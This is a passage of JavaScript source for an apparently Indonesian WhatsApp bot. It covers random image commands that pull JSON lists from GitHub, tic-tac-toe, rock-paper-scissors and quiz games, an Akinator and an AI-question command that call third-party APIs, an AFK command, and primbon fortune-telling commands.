if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
ndaa.sendMessage(m.chat, { image: { url: yeha }, caption : mess.done }, { quoted: m })
}
break
            /* ~~~~~~~~~ GAME FEATURES ~~~~~~~~~ */
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
                let TicTacToe = require("./lib/tictactoe.js")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return newReply('Kamu masih didalam game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    newReply('Partner ditemukan!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                    if (room.x !== room.o) await ndaa.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await ndaa.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    newReply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break
            case 'delttc':
            case 'delttt': {
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        ndaa.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
                    } else if (!this.game) {
                        newReply(`Session TicTacToe🎮 tidak ada`)
                    } else mewReply('?')
                } catch (e) {
                    newReply('rusak')
                }
            }
            break
            case 'suitpvp':
            case 'suit': {
                this.suit = this.suit ? this.suit : {}
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) newReply(`Selesaikan suit mu yang sebelumnya`)
                if (m.mentionedJid[0] === m.sender) return newReply(`Tidak bisa bermain dengan diri sendiri !`)
                if (!m.mentionedJid[0]) return newReply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${_owner[1]}`, m.chat, {
                    mentions: [_owner[1] + '@s.whatsapp.net']
                })
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return newReply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
                let id = 'suit_' + new Date() * 1
                let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
                this.suit[id] = {
                    chat: await ndaa.sendText(m.chat, caption, m, {
                        mentions: parseMention(caption)
                    }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (this.suit[id]) ndaa.sendText(m.chat, `_Waktu suit habis_`, m)
                        delete this.suit[id]
                    }, 60000),
                    poin,
                    poin_lose,
                    timeout
                }
            }
            break
            case 'kuismath':
            case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                let {
                    genMath,
                    modes
                } = require('./lib/math.js')
                if (!text) return newReply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                ndaa.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    newReply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'tebak': {
                if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendMessage(m.chat, {
                        image: {
                            url: result.img
                        },
                        caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`
                    }, {
                        quoted: ftroli
                    }).then(() => {
                        tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}`, m)
                        delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}`, m)
                        delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}`, m)
                        delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                        tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}`, m)
                        delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'tebakan') {
                    if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                        tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktebakan[m.sender.split('@')[0]]}`, m)
                        delete tebaktebakan[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'bendera') {
                    if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendMessage(m.chat, {
                        image: {
                            url: result.img
                        },
                        caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
                    }, {
                        quoted: ftroli
                    }).then(() => {
                        tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.name)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
                        delete tebakbendera[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'bendera2') {
                    if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendMessage(m.chat, {
                        image: {
                            url: result.img
                        },
                        caption: `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`
                    }, {
                        quoted: ftroli
                    }).then(() => {
                        tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.name)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera2[m.sender.split('@')[0]]}`, m)
                        delete tebakbendera2[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kimia') {
                    if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${result.unsur}\nWaktu : 60s`, m).then(() => {
                        tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.lambang)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkimia[m.sender.split('@')[0]]}`, m)
                        delete tebakkimia[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'asahotak') {
                    if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakasahotak[m.sender.split('@')[0]]}`, m)
                        delete tebakasahotak[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'siapakahaku') {
                    if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebaksiapakahaku[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksiapakahaku[m.sender.split('@')[0]]}`, m)
                        delete tebaksiapakahaku[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'susunkata') {
                    if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : 60s`, m).then(() => {
                        tebaksusunkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksusunkata[m.sender.split('@')[0]]}`, m)
                        delete tebaksusunkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'tekateki') {
                    if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) return newReply("Masih Ada Sesi Yang Belum Diselesaikan!")
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ndaa.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
                        tebaktekateki[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        ndaa.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktekateki[m.sender.split('@')[0]]}`, m)
                        delete tebaktekateki[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'akinator':
                newReply(`Akinator adalah sebuah permainan dan aplikasi perangkat bergerak yang berupaya menebak secara rinci dan pasti isi pikiran pengguna permainan ini melalui serentetan pertanyaan.\n\n~> ${prefix}akinatorstart : Untuk memulai\n~> ${prefix}akinatorstop : Untuk berhenti`)
                break
            case 'akinatorstart':
                if (!isPremium) return newReply(mess.prem)
                if (m.isGroup) return newReply(mess.private)
                if (akinator.hasOwnProperty(m.sender.split('@')[0])) return newReply("Selesein yg sebelumnya dulu atuh")
                get_result = await fetchJson(`https://api.lolhuman.xyz/api/akinator/start?apikey=${lol}`)
                let {
                    server, frontaddr, session, signature, question, step
                } = get_result.result
                let srv = {}
                data["server"] = server
                data["frontaddr"] = frontaddr
                data["session"] = session
                data["signature"] = signature
                data["question"] = question
                data["step"] = step
                imi_txt = `${question}\n\n`
                imi_txt += "0 - Ya\n"
                imi_txt += "1 - Tidak\n"
                imi_txt += "2 - Saya Tidak Tau\n"
                imi_txt += "3 - Mungkin\n"
                imi_txt += "4 - Mungkin Tidak"
                ndaa.sendText(m.chat, imi_txt, m).then(() => {
                    akinator[m.sender.split('@')[0]] = srv
                    fs.writeFileSync("./src/data/akinator.json", JSON.stringify(akinator))
                })
                break
            case 'akinatorstop':
                if (!akinator.hasOwnProperty(m.sender.split('@')[0])) return newReply("Anda tidak memiliki akinator sebelumnya")
                delete akinator[m.sender.split('@')[0]]
                fs.writeFileSync("./src/data/akinator.json", JSON.stringify(akinator))
                newReply("Success mengcancel akinator sebelumnya")
                break

            case 'afk':
                if (!m.isGroup) return newReply(mess.group)
                if (isAfkOn) return newReply("Kakak Sudah Afk Sebelumnya")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                newReply(`@${m.sender.split('@')[0]} Sedang AFK\nDengan Alasan : ${reason}`)
                break
            case 'ask':
            case 'openai': {
                if (!isPremium) return newReply(mess.prem)
                if (!q) return newReply('Example: Apa Itu Javascript')
                let d = await fetchJson(`https://api.caliph.biz.id/api/ai/oai-gpt?q=${q}&apikey=${caliph}`)                
                await ndaa.sendMessage(from, {
                    text: d.result
                }, { quoted: ftroli})
            }
            break
                        /* ~~~~~~~~~ PRIMBON ~~~~~~~~~ */
            case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) return newReply(`Contoh : ${prefix + command} 6288292024190`)
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) return newReply(`Contoh : ${prefix + command} belanja`)
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                ndaa.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
